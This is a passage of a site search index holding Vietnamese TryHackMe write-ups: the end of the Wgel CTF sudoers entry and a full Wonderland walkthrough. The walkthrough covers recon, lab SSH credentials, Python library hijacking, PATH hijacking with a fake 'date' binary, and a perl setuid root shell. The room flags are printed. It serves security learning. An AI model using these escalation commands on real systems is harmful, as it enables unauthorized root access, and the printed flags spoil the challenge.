\u0111\u00e2y","title":"/etc/crontab"},{"location":"tryhackme/room/wgelctf/#etcsudoers","text":"T\u1ec7p /etc/sudoers l\u00e0 m\u1ed9t t\u1ec7p c\u1ea5u h\u00ecnh quan tr\u1ecdng trong h\u1ec7 th\u1ed1ng Unix v\u00e0 c\u00e1c h\u1ec7 th\u1ed1ng d\u1ef1a tr\u00ean Unix (nh\u01b0 Linux), \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 qu\u1ea3n l\u00fd quy\u1ec1n truy c\u1eadp \u0111\u1eb7c bi\u1ec7t c\u1ee7a c\u00e1c ng\u01b0\u1eddi d\u00f9ng. N\u00f3 qu\u1ea3n l\u00fd quy\u1ec1n truy c\u1eadp \u0111\u1ec3 th\u1ef1c hi\u1ec7n c\u00e1c l\u1ec7nh v\u1edbi quy\u1ec1n h\u1ea1n \u0111\u1eb7c bi\u1ec7t (nh\u01b0 quy\u1ec1n root) th\u00f4ng qua l\u1ec7nh sudo. T\u1ec7p /etc/sudoers ch\u1ee9a danh s\u00e1ch c\u00e1c quy\u1ec1n truy c\u1eadp \u0111\u1eb7c bi\u1ec7t cho c\u00e1c ng\u01b0\u1eddi d\u00f9ng ho\u1eb7c nh\u00f3m ng\u01b0\u1eddi d\u00f9ng c\u1ee5 th\u1ec3, cho ph\u00e9p h\u1ecd th\u1ef1c hi\u1ec7n c\u00e1c l\u1ec7nh v\u1edbi quy\u1ec1n h\u1ea1n cao h\u01a1n m\u00e0 h\u1ecd th\u01b0\u1eddng kh\u00f4ng c\u00f3. C\u1ea5u tr\u00fac c\u1ee7a t\u1ec7p n\u00e0y c\u00f3 th\u1ec3 kh\u00e1 ph\u1ee9c t\u1ea1p v\u00e0 \u0111\u00f2i h\u1ecfi quy\u1ec1n truy c\u1eadp qu\u1ea3n tr\u1ecb (root) \u0111\u1ec3 ch\u1ec9nh s\u1eeda. M\u1ed7i d\u00f2ng trong t\u1ec7p /etc/sudoers ch\u1ee9a m\u1ed9t quy\u1ec1n truy c\u1eadp \u0111\u01b0\u1ee3c \u0111\u1ecbnh ngh\u0129a theo c\u00fa ph\u00e1p: nguoidung ALL=(quyen) lenh Trong \u0111\u00f3: nguoidung l\u00e0 t\u00ean ng\u01b0\u1eddi d\u00f9ng ho\u1eb7c nh\u00f3m ng\u01b0\u1eddi d\u00f9ng \u0111\u01b0\u1ee3c c\u1ea5p quy\u1ec1n truy c\u1eadp. ALL cho ph\u00e9p ng\u01b0\u1eddi d\u00f9ng s\u1eed d\u1ee5ng sudo t\u1eeb b\u1ea5t k\u1ef3 m\u00e1y t\u00ednh n\u00e0o. (quyen) l\u00e0 quy\u1ec1n truy c\u1eadp c\u1ee5 th\u1ec3 m\u00e0 ng\u01b0\u1eddi d\u00f9ng \u0111\u01b0\u1ee3c ph\u00e9p th\u1ef1c hi\u1ec7n. V\u00ed d\u1ee5: ALL, NOPASSWD, ALL=(ALL:ALL), v.v. lenh l\u00e0 l\u1ec7nh c\u1ee5 th\u1ec3 m\u00e0 ng\u01b0\u1eddi d\u00f9ng c\u00f3 th\u1ec3 th\u1ef1c hi\u1ec7n v\u1edbi quy\u1ec1n \u0111\u1eb7c bi\u1ec7t. V\u00ed d\u1ee5 c\u1ee5 th\u1ec3 v\u1ec1 n\u1ed9i dung trong t\u1ec7p /etc/sudoers: # Cho ph\u00e9p ng\u01b0\u1eddi d\u00f9ng alice th\u1ef1c hi\u1ec7n b\u1ea5t k\u1ef3 l\u1ec7nh n\u00e0o v\u1edbi quy\u1ec1n root m\u00e0 kh\u00f4ng c\u1ea7n m\u1eadt kh\u1ea9u alice ALL =( ALL : ALL ) NOPASSWD : ALL # Cho ph\u00e9p ng\u01b0\u1eddi d\u00f9ng bob th\u1ef1c hi\u1ec7n l\u1ec7nh reboot m\u00e0 kh\u00f4ng c\u1ea7n m\u1eadt kh\u1ea9u bob ALL =( ALL ) NOPASSWD : / sbin / reboot File sudoers trong CorpOne s\u1ebd nh\u01b0 th\u1ebf n\u00e0y \u0111\u00e2y /etc/sudoers Ta ch\u1ec9nh c\u1ea7n ch\u1ec9nh d\u00f2ng jessie ALL=(root) NOPASSWD: /usr/bin/wget th\u00e0nh jessie ALL=(root) NOPASSWD: ALL \u0111\u1ec3 user jessie leo quy\u1ec1n th\u00e0nh c\u00f4ng. root","title":"/etc/sudoers"},{"location":"tryhackme/room/wgelctf/#what-we-learned","text":"Privilege Escalation with wget","title":"What we learned"},{"location":"tryhackme/room/wonderland/","tags":["THM-Room","Privilege Escalation"],"text":"Wonderland \u00b6 Room at https://tryhackme.com/room/wonderland List of the questions solved Question: Obtain the flag in user.txt thm{\"Curiouser and curiouser!\"} Question: Escalate your privileges, what is the flag in root.txt? thm{Twinkle, twinkle, little bat! How I wonder what you\u2019re at!} Pentest scenario \u00b6 Reconnaissance \u00b6 Host: 10.10.176.200 \u0110\u1ea7u ti\u00ean ta n\u00ean c\u00f3 c\u00e1c b\u01b0\u1edbc ki\u1ec3m tra website ban \u0111\u1ea7u nh\u01b0 l\u00e0: v\u00e0o trang web, f12,... Giao di\u1ec7n ch\u00ednh c\u1ee7a website T\u1eeb giao di\u1ec7n tr\u00ean, ta th\u1ea5y r\u1eb1ng h\u00ecnh \u1ea3nh con th\u1ecf n\u1eb1m trong folder img v\u00e0 sau qu\u00e1 tr\u00ecnh recon th\u00ec ta l\u1ea5y \u0111\u01b0\u1ee3c 3 \u1ea3nh trong folder img \u0111\u1ec3 xem li\u1ec7u t\u00e1c gi\u1ea3 c\u00f3 d\u00f9ng steganography cho image hay kh\u00f4ng. H\u00ecnh \u1ea3nh 3 file \u1ea3nh trong folder img Ta ki\u1ec3m th\u1eed steganography trong h\u00ecnh \u1ea3nh b\u1eb1ng binwalk, steghide, stegseek,... th\u00ec ta nh\u1eadn \u0111\u01b0\u1ee3c steg \u0111\u01b0\u1ee3c \u1ea9n trong file white_rabbit_1.jpg v\u00e0 \u0111\u01b0\u1ee3c hint kh\u00e1 l\u00e0 \"h\u1eefu \u00edch\" ::) H\u00ecnh \u1ea3nh n\u1ed9i dung steg \u0111\u01b0\u1ee3c \u1ea9n gi\u1ea5u C\u00f3 v\u1ebb trang ch\u1ee7 kh\u00f4ng c\u00f2n g\u00ec \u0111\u1ec3 \u0111i\u1ec1u tra n\u1eefa, ta s\u1ebd d\u00f9ng c\u00e1c c\u00f4ng c\u1ee5 \u0111\u1ec3 \u0111i\u1ec1u tra c\u00e1c th\u1ee9 kh\u00e1c c\u00f3 trong IP 10.10.176.200. \u0110\u1ea7u ti\u00ean, v\u00ec \u0111\u00e2y l\u00e0 pentest n\u1ed9i b\u1ed9 n\u00ean ta c\u00f3 th\u1ec3 d\u00f9ng nmap \u0111\u1ec3 scan port (c\u00f3 th\u1ec3 scan t\u1ea5t c\u1ea3 c\u00e1c port ho\u1eb7c scan m\u1ed9t \u00edt). Nh\u01b0 th\u01b0\u1eddng l\u1ec7, k\u1ebft qu\u1ea3 nmap cho ra b\u1eb1ng vi\u1ec7c scan NULL th\u00ec website ta \u0111ang c\u00f3 2 port, 1 cho ssh v\u00e0 1 cho http. Terminal PORT STATE SERVICE 22 / tcp open | filtered ssh 80 / tcp open | filtered http Ti\u1ebfp theo, ta s\u1ebd qu\u00e9t c\u00e1c url c\u1ee7a website b\u1eb1ng gobuster ch\u1eb3ng h\u1ea1n Terminal \u2514\u2500 $ gobuster dir -u http :// 10 . 10 . 176 . 200 -w / usr / share / wordlists / dirbuster / directory-list - 2 . 3-medium . txt =============================================================== Gobuster v3 . 5 by OJ Reeves ( @TheColonial ) & Christian Mehlmauer ( @firefart ) =============================================================== [+] Url : http :// 10 . 10 . 176 . 200 [+] Method : GET [+] Threads : 10 [+] Wordlist : / usr / share / wordlists / dirbuster / directory-list - 2 . 3-medium . txt [+] Negative Status codes : 404 [+] User Agent : gobuster / 3 . 5 [+] Timeout : 10s =============================================================== 2023 / 08 / 26 10 : 51 : 12 Starting gobuster in directory enumeration mode =============================================================== / img ( Status : 301 ) [ Size : 0 ] [--> img /] / r ( Status : 301 ) [ Size : 0 ] [--> r /] / poem ( Status : 301 ) [ Size : 0 ] [--> poem /] \u0110\u1ea7u ra c\u1ee7a gobuster cho ta 3 url c\u01a1 b\u1ea3n g\u1ed3m /img, /r, /poem. C\u1ee9 ti\u1ebfp t\u1ee5c gobuster th\u00ec ta s\u1ebd \u0111\u01b0\u1ee3c url http://10.10.176.200/r/a/b/b/i/t \u0111\u00fang v\u1edbi c\u00e1i hint ban \u0111\u1ea7u H\u00ecnh \u1ea3nh website C\u1ee9 t\u01b0\u1edfng l\u1ea1i c\u00f4ng c\u00f3c nh\u01b0 b\u1ea1n th\u1eed f12 trang web l\u00ean \u0111i, \u0111i\u1ec1u b\u1ea5t ng\u1edd s\u1ebd x\u1ea3y ra H\u00ecnh \u1ea3nh password Ta \u0111\u01b0\u1ee3c th\u00f4ng tin \u0111\u0103ng nh\u1eadp ssh (c\u00f3 l\u1ebb v\u1eady). Login ssh th\u00e0nh c\u00f4ng \u0110\u1eebng c\u00f3 xem username: alice password: HowDothTheLittleCrocodileImproveHisShiningTail Init Access \u00b6 Terminal \u2514\u2500 $ ssh alice @10 . 10 . 176 . 200 The authenticity of host '10.10.176.200 (10.10.176.200)' can 't be established. ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:47: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added ' 10 . 10 . 176 . 200 ' (ED25519) to the list of known hosts. alice@10.10.176.200' s password : Welcome to Ubuntu 18 . 04 . 4 LTS ( GNU / Linux 4 . 15 . 0 - 101-generic x86_64 ) * Documentation : https :// help . ubuntu . com * Management : https :// landscape . canonical . com * Support : https :// ubuntu . com / advantage System information as of Sat Aug 26 15 : 16 : 40 UTC 2023 System load : 0 . 1 Processes : 84 Usage of /: 18 . 9 % of 19 . 56GB Users logged in : 0 Memory usage : 15 % IP address for eth0 : 10 . 10 . 176 . 200 Swap usage : 0 % 0 packages can be updated . 0 updates are security updates . Last login : Mon May 25 16 : 37 : 21 2020 from 192 . 168 . 170 . 1 alice @wonderland :~$ V\u00e0o \u0111\u01b0\u1ee3c m\u00e1y ng\u01b0\u1eddi ta r\u1ed3i th\u00ec l\u00e0m g\u00ec ti\u1ebfp ta? Ta c\u00f3 2 h\u01b0\u1edbng c\u01a1 b\u1ea3n nh\u1ea5t c\u1ee7a vi\u1ec7c leo quy\u1ec1n l\u00e0 ki\u1ec3m tra sudo v\u00e0 suid (2 b\u01b0\u1edbc xem nh\u01b0 \u0111\u1ea7u ti\u00ean c\u1ea7n \u0111\u01b0\u1ee3c \u0111\u1ec3 \u00fd t\u1edbi) Hi\u1ec3n nhi\u00ean, ta ph\u1ea3i c\u00f3 th\u1ee7 t\u1ee5c cat /etc/shadow , cat /etc/crontab \u0111\u1ec3 l\u00e0m m\u00f3n khai v\u1ecb V\u1edbi sudo: Ta d\u00f9ng l\u1ec7nh sudo -l \u0111\u1ec3 ki\u1ec3m tra li\u1ec7u v\u1edbi user m\u00ecnh \u0111\u00e3 login th\u00ec s\u1ebd d\u00f9ng \u0111\u01b0\u1ee3c quy\u1ec1n n\u00e0o/d\u01b0\u1edbi t\u00ean ng\u01b0\u1eddi d\u00f9ng n\u00e0o (t\u00ednh c\u1ea3 leo thang \u0111\u1eb7c quy\u1ec1n theo chi\u1ec1u ngang). V\u1edbi suid: Ta d\u00f9ng l\u1ec7nh find / -user root -perm /4000 -type f 2>/dev/null \u0111\u1ec3 ki\u1ec3m tra suid \u0111\u01b0\u1ee3c ch\u1ea1y v\u1edbi root. Terminal alice @wonderland :~$ sudo -l [sudo] password for alice : Matching Defaults entries for alice on wonderland : env_reset , mail_badpass , secure_path =/ usr / local / sbin \\:/ usr / local / bin \\:/ usr / sbin \\:/ usr / bin \\:/ sbin \\:/ bin \\:/ snap / bin User alice may run the following commands on wonderland : ( rabbit ) / usr / bin / python3 . 6 / home / alice / walrus_and_the_carpenter . py Ta th\u1ea5y r\u1eb1ng khi ki\u1ec3m tra sudo th\u00ec v\u1edbi user Alice \u0111\u01b0a ra k\u1ebft qu\u1ea3 (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py t\u1ee9c l\u00e0 user Alice s\u1ebd \u0111\u01b0\u1ee3c d\u00f9ng python t\u1ea1i /usr/bin/python3.6 v\u1edbi quy\u1ec1n c\u1ee7a user rabbit (t\u00f4i d\u00f9ng t\u1eeb \"v\u1edbi quy\u1ec1n\" ch\u1ee9 kh\u00f4ng ph\u1ea3i l\u00e0 quy\u1ec1n t\u01b0\u01a1ng \u0111\u01b0\u01a1ng). Ch\u00fang ta xem th\u1eed file walrus_and_the_carpenter.py ch\u1ee9a g\u00ec trong \u0111\u00f3 walrus_and_the_carpenter.py alice @wonderland : ~ $ cat walrus_and_the_carpenter . py import random poem = \"\"\"The sun was shining on the sea, Shining with all his might: He did his very best to make The billows smooth and bright \u2014 And this was odd, because it was The middle of the night. . . . \"O Oysters,\" said the Carpenter. \"You\u2019ve had a pleasant run! Shall we be trotting home again?\" But answer came there none \u2014 And that was scarcely odd, because They\u2019d eaten every one.\"\"\" for i in range ( 10 ): line = random . choice ( poem . split ( \" \\n \" )) Th\u00ec c\u01a1 b\u1ea3n \u0111\u00e2y l\u00e0 m\u1ed9t \u0111o\u1ea1n ch\u01b0\u01a1ng tr\u00ecnh nh\u1eb1m in ra random d\u00f2ng th\u01a1 nh\u01b0ng c\u00e1i quan tr\u1ecdng ta focus v\u00e0o \u0111\u00e2y l\u00e0 ch\u01b0\u01a1ng tr\u00ecnh n\u00e0y d\u00f9ng dynamic linking (t\u1ee9c l\u00e0 d\u00f9ng th\u01b0 vi\u1ec7n \u0111\u1ed9ng) k\u1ebft n\u1ed1i. C\u1ee5 th\u1ec3 l\u00e0 th\u01b0 vi\u1ec7n random l\u1ea5y t\u1eeb 1 v\u1ecb tr\u00ed n\u00e0o \u0111\u00f3 trong m\u00e1y. Ki\u1ec3m tra v\u1ecb tr\u00ed b\u1eb1ng l\u1ec7nh: locate random.py Terminal alice @wonderland :/ home $ locate random . py / usr / lib / python3 / dist-packages / cloudinit / config / cc_seed_random . py / usr / lib / python3 . 6 / random . py Chuy\u1ec7n g\u00ec x\u1ea3y ra n\u1ebfu ta t\u1ea1o m\u1ed9t file random.py ngay t\u1ea1i folder ch\u1ee9a file walrus_and_the_carpenter.py ? N\u1ebfu ta l\u00e0m nh\u01b0 v\u1eady, khi ta th\u1ef1c thi file walrus_and_the_carpenter.py th\u00ec th\u01b0 vi\u1ec7n n\u00f3 \u0111\u01b0\u1ee3c import s\u1ebd ch\u00ednh l\u00e0 th\u01b0 vi\u1ec7n m\u00e0 ta \u0111\u00e3 t\u1ea1o (t\u1ee9c file random.py) Privilege Escalation \u00b6 Python Library Hijacking \u00b6 \u1ede \u0111\u00e2y t\u00f4i \u0111\u1ec1 c\u1eadp \u0111\u1ebfn vi\u1ec7c dynamic-link library (DLL) v\u00e0 t\u1ea1o 1 library m\u1edbi \u0111\u1ec3 chuy\u1ec3n h\u01b0\u1edbng th\u01b0 vi\u1ec7n nh\u1eb1m \u0111\u1ea1t \u0111\u01b0\u1ee3c m\u1ee5c \u0111\u00edch t\u1ea5n c\u00f4ng ch\u1ee9 kh\u00f4ng \u0111i theo h\u01b0\u1edbng Hijacking v\u00e0o th\u01b0 vi\u1ec7n g\u1ed1c (b\u1ea1n c\u00f3 th\u1ec3 th\u1ea5y ph\u00e2n quy\u1ec1n c\u1ee7a file th\u01b0 vi\u1ec7n, \u0111\u00f3 l\u00e0 l\u00fd do) T\u1edbi \u0111\u00e2y, ta s\u1ebd t\u1ea1o 1 file random.py v\u1edbi m\u1ee5c \u0111\u00edch t\u1ea1o ra m\u1ed9t terminal. Th\u00ec theo logic, user rabbit t\u1ea1o terminal th\u00ec l\u00e0 terminal c\u1ee7a user rabbit random.py alice @wonderland : ~ $ cat random . py import pty pty . spawn ( \"/bin/bash\" ) T\u1ea1o sao l\u1ec7nh t\u1ea1o spawn kia l\u1ea1i trueyenf /bin/bash m\u00e0 kh\u00f4ng ph\u1ea3i /bin/sh, li\u1ec7u truy\u1ec1n /bin/sh th\u00ec chuy\u1ec7n g\u00ec s\u1ebd x\u1ea3y ra? Oke, b\u00e2y gi\u1edd th\u1ef1c thi file walrus_and_the_carpenter.py th\u00f4i sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py Terminal Ta \u0111\u00e3 v\u00e0o th\u00e0nh c\u00f4ng terminal c\u1ee7a user rabbit. Hi\u1ec3n nhi\u00ean l\u00e0 v\u00e0o b\u1eb1ng vi\u1ec7c leo quy\u1ec1n chi\u1ec1u ngang t\u1eeb user Alice n\u00ean ta kh\u00f4ng nh\u1eadn \u0111\u01b0\u1ee3c password \u0111\u00e2u v\u00e0 \u0111\u1ed3ng ngh\u0129a v\u1edbi vi\u1ec7c kh\u00f4ng th\u1ec3 th\u1ef1c hi\u1ec7n l\u1ec7nh sudo -l . Sau khi th\u0103m d\u00f2 h\u1ec7 th\u1ed1ng b\u1eb1ng user rabbit, ta l\u1ea1i ph\u00e1t hi\u1ec7n file teaParty trong /home/rabbit Terminal Ta th\u1eed strings teaParty th\u00ec th\u1ea5y h\u1ec7 th\u1ed1ng b\u00e1o command strings ch\u01b0a \u0111\u01b0\u1ee3c install, \u0111\u1ec3 h\u1ea1n ch\u1ebf vi\u1ec7c ph\u00e1t hi\u1ec7n c\u1ee7a blue team trong h\u1ec7 th\u1ed1ng, ta h\u1ea1n ch\u1ebf install package. M\u1ecdi h\u00e0nh vi m\u01a1 h\u1ed3 tr\u00ean h\u1ec7 th\u1ed1ng \u0111\u1ec1u \u0111\u1ec3 l\u1ea1i d\u1ea5u v\u1ebft. \u0110\u1ec3 d\u00f9ng \u0111\u01b0\u1ee3c strings ta c\u1ea7n install package binutils. Th\u00ec l\u00fac n\u00e0y ph\u00eda b\u00ean kia chi\u1ebfn tuy\u1ebfn c\u00f3 th\u1ec3 d\u00f9ng dpkg \u0111\u1ec3 xem th\u00f4ng tin g\u00f3i ho\u1eb7c c\u00f3 th\u1ec3 d\u00f9ng whereis , which \u0111\u1ec3 ki\u1ec3m tra v\u1ecb tr\u00ed l\u1ec7nh strings . T\u1eeb \u0111\u00e2y, ta s\u1ebd t\u1ea1o 1 m\u00e1y ch\u1ee7 web local \u0111\u1ec3 m\u00e1y attacker c\u00f3 th\u1ec3 l\u1ea5y file teaParty v\u1ec1 ki\u1ec3m th\u1eed H\u00ecnh \u1ea3nh wget file teaParty H\u00ecnh \u1ea3nh m\u1ed9t ph\u1ea7n n\u1ed9i dung file T\u1eeb h\u00ecnh tr\u00ean ta th\u1ea5y \u0111\u01b0\u1ee3c m\u00e3 Terminal Welcome to the tea party ! The Mad Hatter will be here soon . / bin / echo -n 'Probably by ' && date - -date = 'next hour' -R Ask very nicely , and I will give you some tea while you wait for him Segmentation fault ( core dumped ) \u0110o\u1ea1n m\u00e3 n\u00e0y nh\u1eadn bi\u1ebfn date \u0111\u1ec3 hi\u1ec3n th\u1ecb th\u00f4ng tin v\u1ec1 th\u1eddi gian, t\u1edbi \u0111\u00e2y m\u1ed9t \u00fd t\u01b0\u1eddng l\u00f3e l\u00ean trong \u0111\u1ea7u l\u00e0 fake bi\u1ebfn data n\u00e0y \u0111\u1ec3 khi\u1ebfn n\u00f3 hi\u1ec3n th\u1ecb c\u00e1i m\u00e0 ch\u00fang ta \u0111ang quan t\u00e2m. V\u1ea5n \u0111\u1ec1 \u1edf \u0111\u00e2y l\u00e0 g\u00ec? (\u0111\u1ecdc v\u00e0 suy ng\u1eabm...) H\u01a1i kh\u00f3 l\u00fd gi\u1ea3i m\u1ed9t x\u00edu, v\u1ec1 b\u1ea3n ch\u1ea5t \u1edf \u0111\u00e2y, c\u00e1c c\u00e2u l\u1ec7nh nh\u01b0: ls, cd, ... \u0111\u1ec1u l\u00e0 c\u00fa ph\u00e1p r\u00fat ng\u1eafn \u0111i. C\u1ee5 th\u1ec3 h\u01a1n c\u00e1c l\u1ec7nh \u0111\u00f3 b\u1ea3n ch\u1ea5t l\u00e0 1 \u0111\u01b0\u1eddng d\u1eabn t\u1edbi t\u1ec7p tin (t\u1ec7p tin ls , t\u1ec7p tin cd , ...) v\u00e0 c\u00f4ng d\u1ee5ng c\u1ee7a nh\u1eefng t\u1ec7p tin \u0111\u00f3 l\u00e0 output c\u1ee7a l\u1ec7nh m\u00e0 ch\u00fang ta \u0111\u00e3 tr\u1ea3i nghi\u1ec7m qua. N\u00f3i m\u1ed9t c\u00e1ch d\u1ec5 hi\u1ec3u h\u01a1n, \u1edf ph\u1ea7n leo thang \u0111\u1eb7c quy\u1ec1n theo chi\u1ec1u ngang ph\u00eda tr\u00ean, ch\u00ednh user Alice \u0111\u00e3 d\u00f9ng \u0111\u00fang t\u1ec7p tin python () \u0111\u1ec3 leo quy\u1ec1n user rabbit /usr/bin/python3.6 T\u00f3m l\u1ea1i, ta bi\u1ebft r\u1eb1ng trong file teaParty s\u1eed d\u1ee5ng bi\u1ebfn date , ta s\u1ebd t\u1ea1o file date nh\u01b0ng mang \u00fd ngh\u0129a m\u1edf shell \u0111\u1ec3 leo quy\u1ec1n, c\u1ee5 th\u1ec3 ta c\u00f3 th\u1ec3 d\u00f9ng l\u1ec7nh echo \"/bin/bash\" > date . Hi\u1ec3n nhi\u00ean b\u1ea1n ph\u1ea3i chuy\u1ec3n file \u0111\u00f3 v\u00e0o th\u01b0 m\u1ee5c b\u1ea1n c\u00f3 quy\u1ec1n ki\u1ec3m so\u00e1t, c\u1ee5 th\u1ec3 l\u00e0 th\u01b0 m\u1ee5c /tmp v\u00e0 c\u1ea5p quy\u1ec1n cho file (chmod 777). Ngo\u1ea1i tr\u1eeb th\u01b0 m\u1ee5c /tmp, li\u1ec7u c\u00f2n th\u01b0 m\u1ee5c n\u00e0o kh\u00e1c \u0111\u1ec3 ta d\u1eb7t l\u1ea1i bi\u1ebfn $PATH kh\u00f4ng? C\u00f3 th\u1ec3 d\u00f9ng th\u01b0 m\u1ee5c /home/rabbit \u0111\u1ec3 export $PATH thay cho /tmp Tr\u00ean \u0111\u00e2y l\u00e0 c\u00f4ng \u0111o\u1ea1n \u0111\u1ea7u ti\u00ean, \u0111i\u1ec1u g\u00ec s\u1ebd l\u00e0m ti\u1ebfn theo? PATH Variable \u00b6 Nh\u01b0 t\u00f4i \u0111\u00e3 \u0111\u1ec1 c\u1eadp, khi n\u00e0y ta c\u00f3 1 path t\u1edbi date l\u00e0 /tmp/date, nh\u01b0ng v\u1ea5n \u0111\u1ec1 bi\u1ebfn $PATH ch\u01b0a \u0111\u01b0\u1ee3c thay \u0111\u1ed5i. Ta s\u1ebd d\u00f9ng th\u1ee7 thu\u1eadt nh\u1ecf \u0111\u1ec3 thay \u0111\u1ed5i bi\u1ebfn $PATH echo $PATH # Xem $PATH m\u1eb7c \u0111\u1ecbnh export PATH=/tmp:$PATH # \u0111\u01b0a $PATH v\u00e0o tmp \u0111\u1ec3 d\u00f9ng \u0111\u01b0\u1ee3c date Xong, ti\u1ebfn h\u00e0nh ch\u1ea1y file teaParty Leo quy\u1ec1n th\u00e0nh c\u00f4ng Oke, ta v\u00e0o \u0111\u01b0\u1ee3c user hatter v\u00e0 l\u1ee5m \u0111\u01b0\u1ee3c file password.txt H\u00ecnh \u1ea3nh password password: WhyIsARavenLikeAWritingDesk? ::) Ph\u1ea3i c\u00f3 password m\u1edbi d\u00f9ng sudo -l \u0111\u01b0\u1ee3c ch\u1ee9 sudo -l Wao, th\u1eadt b\u1ea5t ng\u1edd :v T\u1edbi \u0111\u00e2y l\u00e0m g\u00ec n\u1eefa ??? Capabilities \u00b6 Ch\u00fang ta l\u1ea1i qu\u00ean 1 ki\u1ec3m tra \u0111\u1eb7c quy\u1ec1n c\u01a1 b\u1ea3n khi v\u00e0o m\u00e1y n\u1ea1n nh\u00e2n \u0111\u00f3 l\u00e0 Capabilities h\u00ecnh \u1ea3nh Capabilities Ta th\u1ea5y t\u1ea1i perl c\u00f3 set_id :arrow: ta c\u00f3 th\u1ec3 leo quy\u1ec1n \u0111\u01b0\u1ee3c D\u00f9ng l\u1ec7nh trong https://gtfobins.github.io/gtfobins/perl/#capabilities perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";' Ta s\u1ebd leo \u0111\u01b0\u1ee3c quy\u1ec1n root Terminal hatter @wonderland :~$ / usr / bin / perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";' # whaomi / bin / sh : 1 : whaomi : not found # whoami root # ^C # exit hatter @wonderland :~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";' # whoami root # cd /home/alice # cat root.txt thm { Twinkle , twinkle , little bat ! How I wonder what you \u2019 re at !} # find / -iname user.txt / root / user . txt # cat /root/user.txt thm { \"Curiouser and curiouser!\" } # Th\u1ef1c ra file user.txt th\u00ec nh\u00ecn hint \u1edf tryhackme ta s\u1ebd t\u00ecm \u0111\u01b0\u1ee3c \u1edf nh\u1eefng gi\u00e2y ph\u00fat ban \u0111\u1ea7u. Nh\u01b0ng hi\u1ec7n t\u1ea1i m\u00ecnh \u0111\u00e3 l\u00e0 root, vi\u1ec7c t\u00ecm file c\u0169ng ch\u01b0a mu\u1ed9n \u0111\u00fang kh\u00f4ng? What we learned \u00b6 Linux Privilege Escalation with Python Library Hijacking Linux Privilege Escalation with PATH Variable Linux Privilege Escalation with Capabilities 4*. abcd","title":"Wonderland"},{"location":"tryhackme/room/wonderland/#wonderland","text":"Room at https://tryhackme.com/room/wonderland List of the questions solved Question: Obtain the flag in user.txt thm{\"Curiouser and curiouser!\"} Question: Escalate your privileges, what is the flag in root.txt? thm{Twinkle, twinkle, little bat! How I wonder what you\u2019re at!}","title":"Wonderland"},{"location":"tryhackme/room/wonderland/#pentest-scenario","text":"","title":"Pentest scenario"},{"location":"tryhackme/room/wonderland/#reconnaissance","text":"Host: 10.10.176.200 \u0110\u1ea7u ti\u00ean ta n\u00ean c\u00f3 c\u00e1c b\u01b0\u1edbc ki\u1ec3m tra website ban \u0111\u1ea7u nh\u01b0 l\u00e0: v\u00e0o trang web, f12,... Giao di\u1ec7n ch\u00ednh c\u1ee7a website T\u1eeb giao di\u1ec7n tr\u00ean, ta th\u1ea5y r\u1eb1ng h\u00ecnh \u1ea3nh con th\u1ecf n\u1eb1m trong folder img v\u00e0 sau qu\u00e1 tr\u00ecnh recon th\u00ec ta l\u1ea5y \u0111\u01b0\u1ee3c 3 \u1ea3nh trong folder img \u0111\u1ec3 xem li\u1ec7u t\u00e1c gi\u1ea3 c\u00f3 d\u00f9ng steganography cho image hay kh\u00f4ng. H\u00ecnh \u1ea3nh 3 file \u1ea3nh trong folder img Ta ki\u1ec3m th\u1eed steganography trong h\u00ecnh \u1ea3nh b\u1eb1ng binwalk, steghide, stegseek,... th\u00ec ta nh\u1eadn \u0111\u01b0\u1ee3c steg \u0111\u01b0\u1ee3c \u1ea9n trong file white_rabbit_1.jpg v\u00e0 \u0111\u01b0\u1ee3c hint kh\u00e1 l\u00e0 \"h\u1eefu \u00edch\" ::) H\u00ecnh \u1ea3nh n\u1ed9i dung steg \u0111\u01b0\u1ee3c \u1ea9n gi\u1ea5u C\u00f3 v\u1ebb trang ch\u1ee7 kh\u00f4ng c\u00f2n g\u00ec \u0111\u1ec3 \u0111i\u1ec1u tra n\u1eefa, ta s\u1ebd d\u00f9ng c\u00e1c c\u00f4ng c\u1ee5 \u0111\u1ec3 \u0111i\u1ec1u tra c\u00e1c th\u1ee9 kh\u00e1c c\u00f3 trong IP 10.10.176.200. \u0110\u1ea7u ti\u00ean, v\u00ec \u0111\u00e2y l\u00e0 pentest n\u1ed9i b\u1ed9 n\u00ean ta c\u00f3 th\u1ec3 d\u00f9ng nmap \u0111\u1ec3 scan port (c\u00f3 th\u1ec3 scan t\u1ea5t c\u1ea3 c\u00e1c port ho\u1eb7c scan m\u1ed9t \u00edt). Nh\u01b0 th\u01b0\u1eddng l\u1ec7, k\u1ebft qu\u1ea3 nmap cho ra b\u1eb1ng vi\u1ec7c scan NULL th\u00ec website ta \u0111ang c\u00f3 2 port, 1 cho ssh v\u00e0 1 cho http. Terminal PORT STATE SERVICE 22 / tcp open | filtered ssh 80 / tcp open | filtered http Ti\u1ebfp theo, ta s\u1ebd qu\u00e9t c\u00e1c url c\u1ee7a website b\u1eb1ng gobuster ch\u1eb3ng h\u1ea1n Terminal \u2514\u2500 $ gobuster dir -u http :// 10 . 10 . 176 . 200 -w / usr / share / wordlists / dirbuster / directory-list - 2 . 3-medium . txt =============================================================== Gobuster v3 . 5 by OJ Reeves ( @TheColonial ) & Christian Mehlmauer ( @firefart ) =============================================================== [+] Url : http :// 10 . 10 . 176 . 200 [+] Method : GET [+] Threads : 10 [+] Wordlist : / usr / share / wordlists / dirbuster / directory-list - 2 . 3-medium . txt [+] Negative Status codes : 404 [+] User Agent : gobuster / 3 . 5 [+] Timeout : 10s =============================================================== 2023 / 08 / 26 10 : 51 : 12 Starting gobuster in directory enumeration mode =============================================================== / img ( Status : 301 ) [ Size : 0 ] [--> img /] / r ( Status : 301 ) [ Size : 0 ] [--> r /] / poem ( Status : 301 ) [ Size : 0 ] [--> poem /] \u0110\u1ea7u ra c\u1ee7a gobuster cho ta 3 url c\u01a1 b\u1ea3n g\u1ed3m /img, /r, /poem. C\u1ee9 ti\u1ebfp t\u1ee5c gobuster th\u00ec ta s\u1ebd \u0111\u01b0\u1ee3c url 